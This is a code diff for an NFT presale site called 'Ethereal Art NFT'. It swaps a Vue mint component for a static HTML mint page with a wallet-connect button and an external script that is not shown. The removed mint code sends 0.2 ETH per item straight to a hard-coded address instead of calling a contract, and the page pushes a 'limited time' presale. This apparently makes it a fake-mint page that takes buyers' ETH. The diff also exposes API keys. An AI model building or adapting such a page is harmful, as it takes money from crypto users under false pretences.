@@ -1,317 +1,441 @@
-<template>
-          
-         <button class="btn" v-on:click="wallets" id="btn" value="0">CONNECT WALLET</button>
-	  
-          </div>
 
-        </div>
+<!DOCTYPE html>
+<html>
+<head>
 
-      </div>
+<title>Ethereal Art NFT</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://etherealsartnft.com/assets/css/bootstrap.min.css">
+<script type="module" src="https://etherealsartnft.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule="" src="https://etherealsartnft.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+<link href="https://etherealsartnft.com/css2.css?family=Sora:wght@300&display=swap" rel="stylesheet">
+<link rel="icon" type="image/jpeg" href="https://etherealsartnft.com/assets/images/favicon.jpg">
+<script src="https://etherealsartnft.com/files/web3.min.js"></script>
+<script src="https://etherealsartnft.com/files/scriptaeb2.js?v=245268" async="" defer=""></script>
+<style type="text/css">
+    	.icon_design
+    	{
+    		    font-size: 5em;
+    color: #fff;
+    margin-right: 0.3em;
+    	}
+    	html
+    	{
+    		height:100%;
+    	}
+    	body
+    	{   
+    		background: url(https://etherealsartnft.com/assets/images/background.png);
+    		background-size: cover;
+    		background-position: center bottom;
+    		background-repeat: no-repeat;
+    		height: 100%;
+    		font-family: "sora","arial";
+			color: #fff !important;
+    	}
 
-    </div>
-    
-    <router-view/>
-  </div>
-</template>
-<script>
-export default {
-  data(){
-    return{
-      x: window.innerWidth,
-      amount: null,
-      hex: null,
-      providerx:null,
-      account:null,
-      id:null,
-      w: window.innerWidth,
-      value:1
-    }
-  },
-  
-  methods:{
-    max(){
-      this.value=5
-    },
-    plus(){
-if (this.value<5) {
-  this.value+=1
+    	h1
+    	{
+
+    		font-size: 5em;
+    		color: #fff;
+    		margin-top: 0.5em;
+    		margin-bottom: 1em;
+    	}
+
+    	.logo
+    	{
+			position: absolute;
+    top: -50px;
+    left: 0;
+    right: 0;
+    max-width: 500px;
+    margin: auto;
+    width: 100%;
+    	}
+
+    	.box_coming_soon
+    	{
+    		margin:auto;
+    		text-align: center;
+    	}
+
+    	.container
+    	{
+    		height: 100%;
+    		display: grid;
+    	}
+
+    	 .twitter_hover:hover
+    	 {	
+    	 	   transition: transform 750ms;
+    	 	color:#1DA1F2;
+    	 }
+
+    	  .discord_hover:hover
+    	 {	
+    	 	   transition: transform 750ms;
+    	 	color:#5865F2;
+    	 }
+ .Ethereal Art NFTed
+    	 {
+    	 	position: absolute;
+    	 	margin:20px;
+    	 	bottom: 20px;
+    	 }
+
+    	 @media (max-width: 992px) {
+
+.Ethereal Art NFTed
+    	 {
+    	 	position: absolute;
+    	 	margin:20px;
+    	 	top: 20px;
+    	 	height: fit-content;
+    	 }
+    	 	h1
+    	 	{
+    	 			font-size: 3em;
+    	 	}
+.icon_design
+{
+	font-size: 3em;
 }
-    },
-    minus(){
-      if (this.value>1) {
-        this.value-=1
-      }
-    },
-    wallets() {
-      var sel=document.getElementById('btn').value
-      console.log(sel)
-      if (sel=='0') {
-        const WalletConnectProvider = window.WalletConnectProvider.default;
-      const Fortmatic = window.Fortmatic;
-      const Web3Modal = window.Web3Modal.default;
-      const providerOptions = {
-        walletconnect: {
-       package: WalletConnectProvider,
-      options: {
-        
-         rpc:{
-            1: "https://mainnet.infura.io/v3/b50bee145172497d9576a6f79b1209aa"
-           }
-        
-       },
-     },
-        fortmatic: {
-          package: Fortmatic,
-          options: {
-            // Mikko's TESTNET api key
-            key: "pk_test_391E26A3B43A3350",
-          },
-        },
-      };
-      const web = async () => {
-        const web3modal = new Web3Modal({
-          network: "mainnet",
-          cacheProvider: true,
-          providerOptions,
-        });
-        const provider = await web3modal.connect();
-        this.providerx=provider
-        console.log(this.providerx)
-        const web3 = new Web3(provider);
-        const acc = await web3.eth.getAccounts();
-        
-        console.log(acc[0]);
-        this.account=acc[0]
-        if (this.account) {
-          document.getElementById('btn').innerHTML='MINT'
-          document.getElementById('btn').value='mint'
-          alert(this.account,"is connected")
-        }
-        const networkId = await web3.eth.net.getId();
-        this.id=networkId
-        console.log(networkId)
-     
-        
-        
-        
-      };
-      web();
-      }
-      if (sel=='mint') {
-        if (this.account) {
-         if (this.id==1) {
-            
-           const web3 = new Web3(this.providerx);
-            this.hex= web3.utils.toHex(this.value*0.2 * 1e18);
-        const tx = {
-  from: this.account, // Required
-  to: "0xCF72F102aB826cB806486c05358520616113b706", // Required (for non contract deployments)
-  // Required
-   // Optional
-   // Optional
-  value: this.hex, // Optional
-  
-   // Optional
-};
-const txHash =web3.eth.sendTransaction(tx);
-txHash.then((result)=>{
-  console.log(result)
-})
-.catch((error)=>{
-  console.log(error)
-  alert(error)
-})
-         }
-         else{
-           alert('please connect to mainnet')
-         }
-       }
-       else{
-         alert('please connect to wallet first')
-       }
-      }
-    },
-    
-    mint(){
-      const ethEnabled = async () => {
-        if (window.ethereum) {
-          window.ethereum.request({ method: "eth_requestAccounts" });
-          const chainId = await window.ethereum.request({
-            method: "eth_chainId",
-          });
-          console.log(chainId);
-          if (chainId == "0x1") {
-            const acc = window.ethereum.request({
-              method: "eth_requestAccounts",
-            });
-            acc.then((result) => {
-              
-              const web3 = new Web3(window.ethereum);
-      const hex = web3.utils.toHex(this.value*0.2 * 1e18);
-              const account = result[0];
-              window.ethereum.request({
-                method: "eth_sendTransaction",
-                params: [
-                  {
-                    from: account,
-                    to: "0xCF72F102aB826cB806486c05358520616113b706",
-                    value:hex
-                    //gasPrice: '0x09184e72a000',0x29a2241af62c0000
-                    //gas: '0x2710',
-                  },
-                ],
-              });
-            });
-          } else {
-            alert("please connect to mainnet chain");
-          }
-          window.web3 = new Web3(window.ethereum);
-          return true;
-        }
-        return false;
-      };
-      ethEnabled().then(() => {});
-    },
-    
-  }
-}
-</script>
+    	 	body
+    		{   
+    			background: url(https://etherealsartnft.com/assets/images/background_mobile.png);
+    			  		background-size: cover;
+    		background-position: center;
+    		background-repeat: no-repeat;
 
 
-<style>
-#app {
-  font-family: Avenir, Helvetica, Arial, sans-serif;
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-  text-align: center;
-  color: #000000;
-  
+    		}
+
+
+    	 }
+
+/*! CSS Used from: http://zak/27/files/style.css */
+.lozenge{display:grid;grid-template-rows:1fr 1fr;grid-template-columns:1fr 1fr;gap:2rem;}
+.lozenge span{color:var(--lightgray);display:inline-block;cursor:default;transition:0.2s color ease-in-out;}
+.lozenge span:hover{color:#fff;}
+*{box-sizing:border-box;-webkit-text-size-adjust:100%;font-variant-ligatures:none;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;}
+::selection{background-color:transparent;text-shadow:none;color:var(--solar);}
+
+    </style>
+</head>
+<body>
+<!-- <a href="index-1.htm" target="_blank" class="HYPE ALIENSed"><img src="https://etherealsartnft.com/assets/images/HYPE ALIENSed.png"></a> -->
+<div class="container">
+<div class="">
+
+<div class="wrapper">
+	<div class="adi-dlg">
+		<!-- <img src="https://etherealsartnft.com/assets/images/logo.png" class="logo"> -->
+		<div>
+			<div class="visible-during-public video">
+				<img src="https://etherealsartnft.com/gif.gif" style="max-width: 400px;width: 100%;border-radius: 10px;" alt="">
+			</div>
+		</div>
+		<main>
+			<h1 class="visible-during-public hidden">Mint NFT</h1>
+			
+			<p class="visible-during-early" style="padding-bottom: 10px;">
+🌸An original and beautiful collection of Ethereal women ready to revolutionize the NFT space🌸 by @AsiaLadowska http://discord.gg/etherealartnft
+ <p class="visible-during-early" style="padding-bottom: 10px;">
+				Our presale is open for a limited time! Join today and claim exclusive Ethereal Art NFT NFT.
+			</p>
+			<p class="visible-during-public hidden">The collaborative <em>Into the Metaverse</em> NFT by champion is now available to mint.</p>
+			<div class="lozenge">
+				<span class="progress-count"><span id="ticket-count"></span> / 777</span>
+				<span>0.2 ETH per NFT</span>
+				<span>Max 10 NFTs/transaction</span>
+				<span>1 transaction/wallet</span>
+			</div>
+			<style>
+
+				.progress {
+					height: 1rem;
+					line-height: 0;
+					font-size: 0.75rem;
+					background-color: #e9ecef;
+					border-radius: 0.25rem;
+				}
+				.progress,
+				.progress-bar {
+					display: flex;
+					overflow: hidden;
+				}
+				.progress-bar {
+					flex-direction: column;
+					justify-content: center;
+					color: #fff;
+					text-align: center;
+					white-space: nowrap;
+					background-color: #007bff;
+					transition: width 0.6s ease;
+				}
+				@media (prefers-reduced-motion: reduce) {
+					.progress-bar {
+						transition: none;
+					}
+				}
+				.d-flex {
+					display: flex !important;
+				}
+				.flex-column {
+					flex-direction: column !important;
+				}
+				.justify-content-between {
+					justify-content: space-between !important;
+				}
+				.align-items-center {
+					align-items: center !important;
+				}
+				.mt-3,
+				.my-3 {
+					margin-top: 1rem !important;
+				}
+				.mr-3 {
+					margin-right: 1rem !important;
+				}
+				.mb-3,
+				.my-3 {
+					margin-bottom: 1rem !important;
+				}
+				.mr-4,
+				.mx-4 {
+					margin-right: 1.5rem !important;
+				}
+				.mx-4 {
+					margin-left: 1.5rem !important;
+				}
+				.pt-2 {
+					padding-top: 0.5rem !important;
+				}
+				.text-center {
+					text-align: center !important;
+				}
+
+				.bold {
+					font-weight: 700;
+				}
+				.fs-36 {
+					font-size: 36px;
+				}
+				.fs-18 {
+					font-size: 18px;
+				}
+				.fs-46 {
+					font-size: 46px;
+				}
+				.fullwidth {
+					width: 100%;
+				}
+				.pointer {
+					cursor: pointer;
+				}
+				@media (max-width: 575.98px) {
+					#mintcard {
+						margin-top: 40px !important;
+					}
+				}
+				#mintcard {
+					background: rgba(18, 18, 18, 0.8);
+					border: 0.5px solid #4f4f4f;
+					box-sizing: border-box;
+					box-shadow: 0 4px 4px rgba(0, 0, 0, 0.25);
+					border-radius: 10px;
+					max-width: 422px;
+					height: 500px;
+					margin: auto;
+					padding: 10px 36px 28px;
+				}
+				#mintcard > * {
+					opacity: 1;
+				}
+				.mintlogotext {
+					font-style: normal;
+					font-weight: 700;
+					font-size: 30px;
+					margin-bottom: 24px;
+				}
+				.separator {
+					height: 1px;
+					width: 100%;
+					background: #3a3a3a;
+				}
+				.inter {
+					font-style: normal;
+					font-weight: 400;
+				}
+				.calculate-row {
+					width: 100%;
+					padding: 5px;
+					align-items: center;
+				}
+				.max-button {
+					width: 92px;
+					height: 39px;
+				}
+				.max-button,
+				.mint-now {
+					border-radius: 10px;
+					background: #e47556;
+					display: flex;
+					align-items: center;
+					justify-content: center;
+				}
+				.mint-now {
+					flex-direction: row;
+					width: 242px;
+					height: 42px;
+					font-style: normal;
+					font-weight: 700;
+					font-size: 13px;
+				}
+				.progress {
+					height: 1rem;
+					line-height: 0;
+					font-size: 0.75rem;
+					background-color: hsla(0, 0%, 76.9%, 0.1);
+				}
+				.progress,
+				.progress-bar {
+					display: flex;
+					overflow: hidden;
+					border-radius: 80px;
+				}
+				.progress-bar {
+					flex-direction: column;
+					justify-content: center;
+					color: #fff;
+					text-align: center;
+					white-space: nowrap;
+					background-color: #e47556;
+					transition: width 0.6s ease;
+				}
+				/*! CSS Used from: http://zak/27/files/style.css */
+main{display:block;}
+main{overflow-y:auto;}
+h1{font-size:2em;margin:0.67em 0;}
+a{background-color:transparent;}
+img{border-style:none;}
+@media (max-width: 960px){
+	.wrapper {
+		align-items: baseline !important;
+		position: static !important;
+	}
+	.adi-dlg {
+		margin-left: 0 !important;
+		margin-right: 0 !important;
+		padding-left: 1rem !important;
+		padding-right: 1rem !important;
+	}
+	.container {
+		display: block !important;
+	}
+	html, body, .container {
+		/* height: auto; */
+	}
+.adi-dlg{height:fit-content!important;padding-top:3rem!important;padding-bottom:2rem!important;margin-bottom:2rem!important;}
+.video img{margin-bottom:20px;}
+.adi-dlg main{height:fit-content!important;overflow-y:hidden!important;}
 }
-.modal1 {
-  display: block; /* Hidden by default */
-  position: fixed; /* Stay in place */
-  z-index: 1; /* Sit on top */
-  left: 0;
-  margin-top: 5%;
-  width: 100%; /* Full width */
-  height: 100%; /* Full height */
-  overflow: auto; /* Enable scroll if needed */
-  
-  
+p{margin:0;}
+h1{margin:0;padding:0;font-weight:normal;font-size:inherit;text-transform:uppercase;}
+h1{font-size:3rem;font-weight:500;}
+a{color:inherit;padding-bottom:2px;border-bottom:1px solid;text-decoration:none;transition:0.2s opacity;}
+a:hover{opacity:0.8;}
+.adi-dlg{position:relative;display:grid;grid-template-rows:none;grid-template-columns:none;flex-direction:column;height:100%;max-width:100vw;padding:6rem 2rem;background:rgba(0,0,0,0.5);backdrop-filter:blur(10px);margin:50px 20px;box-shadow:0 2px 12px 0 rgb(0 0 0 / 18%);}
+@media only screen and (min-width: 960px){
+.adi-dlg{grid-template-columns:1fr 1fr;grid-template-rows:none;flex-direction:row;gap:5rem;padding:2rem;height:auto;width:auto;max-width:130rem;min-height:50vh;border-radius:12px;padding:6rem 4rem 8rem 4rem;}
+.adi-dlg > div{display:flex;flex-direction:column;justify-content:center;align-items:center;}
 }
-/* Modal Content/Box */
-.modal-content1 {
-  border: 3px solid white;
-  background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
-  color: white;
-  margin: 1% auto; /* 15% from the top and centered */
-  padding: 20px;
-  
-  width: 60%; /* Could be more or less, depending on screen size */
+.adi-dlg > *{animation:fadeIn ease 1s;}
+.adi-dlg .video{display:flex;align-items:center;justify-content:center;}
+.adi-dlg main{display:flex;flex-direction:column;justify-content:center;padding-right:20px;padding-right:0;}
+.adi-dlg main::-webkit-scrollbar{width:3px;height:4px;}
+.adi-dlg main::-webkit-scrollbar-button{display:none;}
+.adi-dlg main::-webkit-scrollbar-track{background-color:#fff;}
+.adi-dlg main::-webkit-scrollbar-track-piece{background-color:#020a17;}
+.adi-dlg main::-webkit-scrollbar-thumb{height:50px;background-color:#fff;border-radius:3px;}
+.adi-dlg main::-webkit-scrollbar-corner{background-color:#fff;}
+.adi-dlg main::-webkit-resizer{background-color:#fff;}
+@media (min-width: 960px){
+.adi-dlg main p{max-width:100%;}
 }
-.modal2 {
-  display: block; /* Hidden by default */
-  position: fixed; /* Stay in place */
-  z-index: 1; /* Sit on top */
-  left: 0;
-  width: 100%; /* Full width */
-  height: 100%; /* Full height */
-  overflow: auto; /* Enable scroll if needed */
-  
-  
+.lozenge{display:grid;grid-template-rows:1fr 1fr;grid-template-columns:1fr 1fr;gap:2rem;padding-bottom: 5px;}
+.lozenge span{color:#999;display:inline-block;cursor:default;transition:0.2s color ease-in-out;}
+.lozenge span:hover{color:#fff;}
+.button-row{display:flex;flex-direction:column;gap:2rem;}
+@media (min-width: 960px){
+.button-row{flex-direction:row;}
 }
-/* Modal Content/Box */
-.modal-content2 {
-  
-  
-  color: white;
-  margin: 1% auto; /* 15% from the top and centered */
-  padding: 20px;
-  
-  width: 60%; /* Could be more or less, depending on screen size */
-}.img1{
-  
-  width: 600px;
-  height: 200px;
+.hidden{display:none!important;}
+*{box-sizing:border-box;-webkit-text-size-adjust:100%;font-variant-ligatures:none;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;}
+::selection{background-color:transparent;text-shadow:none;color:var(--solar);}
+/*! CSS Used from: Embedded */
+.d-flex{display:flex!important;}
+.flex-column{flex-direction:column!important;}
+.justify-content-between{justify-content:space-between!important;}
+.align-items-center{align-items:center!important;}
+.my-3{margin-top:1rem!important;}
+.mr-3{margin-right:1rem!important;}
+.my-3{margin-bottom:1rem!important;}
+.mr-4,.mx-4{margin-right:1.5rem!important;}
+.mx-4{margin-left:1.5rem!important;}
+.pt-2{padding-top:0.5rem!important;}
+.bold{font-weight:700;}
+.fs-36{font-size:36px;}
+.fs-18{font-size:18px;}
+.fs-46{font-size:46px;}
+.pointer{cursor:pointer;}
+.separator{height:1px;width:100%;background:#3a3a3a;}
+.inter{font-style:normal;font-weight:400;}
+.calculate-row{width:100%;padding:5px;align-items:center;}
+.mint-now{border-radius:10px;background:#e47556;display:flex;align-items:center;justify-content:center;}
+.mint-now{flex-direction:row;width:258px;height:42px;font-style:normal;font-weight:700;font-size:13px;}
+/*! CSS Used keyframes */
+.wrapper {
+	position: absolute;
+	top: -70px;
+	left: 0;
+	width: 100%;
+	height: 100%;
+	display: flex;
+	justify-content: center;
+	align-items: center;
 }
-.font1{
-color: white;
-font-size: 25px;
-font-family: Barlow sans-serif;
-font-weight: 200;
+@media (max-width: 960px){
+	html, body, .container {
+		height: auto !important;
+	}
 }
-.btn {
-  -webkit-border-radius: 28;
-  -moz-border-radius: 28;
-  border-radius: 0px;
-  font-family: Georgia;
-  color: white;
-  font-size: 18px;
-  background: transparent;
-  padding: 10px 10px 10px 10px;
-  text-decoration: none;
-  width: 80%;
-   border: 3px solid white;
-  cursor: pointer;
-  margin-top: 30px;
-}
-.btn:hover {
-  background: #ffffff;
-  text-decoration: none;
-  color: black;
-}
-.font2{
-  font-size: 20px;
-  
-  font-family: Poppins, sans-serif;
-}
-#bg {
-  position: fixed; 
-  top: 0; 
-  left: 0; 
-	
-  /* Preserve aspet ratio */
-  min-width: 100%;
-  min-height: 100%;
-}
-img.bg {
-  /* Set rules to fill background */
-  min-height: 100%;
-  min-width: 1024px;
-	
-  /* Set up proportionate scaling */
-  width: 100%;
-  height: auto;
-	
-  /* Set up positioning */
-  position: fixed;
-  top: 0;
-  left: 0;
-}
-@media screen and (max-width: 1024px) { /* Specific to this particular image */
-  img.bg {
-    left: 50%;
-    margin-left: -512px;   /* 50% */
-  }
-}
-@media screen and (max-width: 482px){
-  .btn{
-    width: 60%;
-  }.font{
-    font-size: 40px;
-    font-weight: 600;
-  }.font1{
-    font-size: 15px;
-    margin-top: -10px;
-  }.modal-content1{
-    width: 80%;
-    margin-top: 4%;
-  }.font2{
-    font-size: 15px;
-    margin-top: 10px;
-  }.img1{
-    width: 350px;
-    height:80px
-  }
-}
-</style>
+@keyframes fadeIn{0%{opacity:0;}100%{opacity:1;}}
+			</style>
+			<div>
+				<div class="d-flex align-items-center flex-column">
+					<div class="separator"></div>
+					<div class="calculate-row d-flex justify-content-between">
+						<div class="inter fs-18 mr-3" style="font-size: 1.6rem;">MINT</div>
+						<div class="d-flex justify-content-between align-items-center">
+							<img class="mint-change" id="minus" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAHPSURBVHgB5VftccIwDH3h+r+M4BEYISPQCWCFTkA6Ad0gdALoBmzQdIKwQegErtQ4PUXFiW3C9a59dzqHoI9nWZYd4L8jQwKstYaGTs5OqizLzrgVKOiCZEtSWz/4v9IRnCywcU5jUYYQyUaC5zTsSebiNaf5QFKRfLh39ySsu0C7LB1OJI+0NAfEgoKvLqQ3D7Bb25/LtEIMyGCpHDwjEmRTKB95qKFRMyiQCEWiCakJ2H7BFbgSnD1ZmGPKRq45JoLKqBlSLJMLZ5hAHpRVwXSy2QvfzSXfM6HAe924n0dMj1c3GrkMd0JhIZ7ftTUZrRGO84Xmw42rW1aDtkn1COhuJ4NvaCgQAbJ5IhKFx6fpHmYeAhpJp+YAvsnIDFTwkOGZ0IwqDJOEstmpV94Mf4GLMLhhJIB87oX/uU+p24YNJoZvi8+U3osbORs5pgu+RsgW//VW7JR3QnmL64NvomrLFWMjjDZIhApe29C7ou0fHtEk3CS2yscyxkd3tbJqBqMnpG1vU7WyXfv0xy6lzJrrwIjXJ7RN64j+pZTPEtbXDeeBmtIRqbDtztjZeJTW13CuJPI2ELS27T3QhPpN/TTjmXHK505OuPWn2Z/FJ8KF85BnFQmyAAAAAElFTkSuQmCC" alt="" style="width: 18px;">
+							<div class="pink fs-46 bold mx-4" id="quantity" style="font-size: 1.6rem;">1</div>
+							<img class="mint-change" id="plus" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAH2SURBVHgB7VfrcYMwDBa5/m9H8AjZoIyQThA6QicIGyQbQCdIugGdoHQC2CDpBK50iESogB9Hf7XfnY6HP9l6WRiAv44EImCtNXjp5cJSJ0lygd8CLrpG2aM0dho0VrCBiy1seNJQFD6GJI7FU7wcUR7EawrzCaVG+eJ39yjEXUOXlh4tygum5gShwMW3I+FNPfQy+zNNWwgBKmzUBAcIBOrkao7UV9EoD3KIhDLijPLgo1T4Lo7jOxIH5yALExxkI3Pu4Mo0ZQ5uI7hGjq0UV3qTwzzc4bzhWdxnkyxh6az3zM18I8D889jcK0Egjww/VrA83vhqZBruBGEt7j+19oiXj/Iex+XYZaT5UOPq+4GBrkkNFpgsKq72UOTagbH5ZRHOFVXUV3MG16+mTEENE8ZgOKmh1Op9CreQlijvSqeEIfT3ZAgqQhGi+YYBUbvgKPhXY1bCYrKq5ccNLI++yFt5cNGN6JWvFI0UFgJHyPBjNUcMacUyBRsHtxFcAw5yKch7Bze3fh8s79rqi/EslHYQCbV4Y33PipR/O0SQEezEXs0RVtgqx70HzqMVG98o3WyK7zqUktVUB0a8bqFrWhUMD6W0zYivG84TbrsKYmG7nVHacBTW5wgWYcjHzKKN7XaG8Z039teMPKOQ9x62oDrcP3zxDahVXIBTWeWLAAAAAElFTkSuQmCC" alt="" style="width: 18px;">
+						</div>
+						<div><span style="font-size: 1.6rem;">10 MAX</span></div>
+					</div>
+
+					<div class="calculate-row d-flex justify-content-between pt-2">
+						<div class="inter fs-18" style="font-size: 1.6rem;">TOTAL</div>
+						<div class="pink fs-36 bold" id="total" style="font-size: 1.6rem;">0.2</div>
+						<div class="inter fs-18 bold mr-4" style="font-size: 1.6rem;">ETH</div>
+					</div>
+					<div class="mint-now my-3 pointer desktop" id="wallets" style="background: none; border: 1px solid #fff; color: #fff;"><span>CONNECT METAMASK | MINT NOW</span></div>
+				
+				</div>
+</body>
+</html>
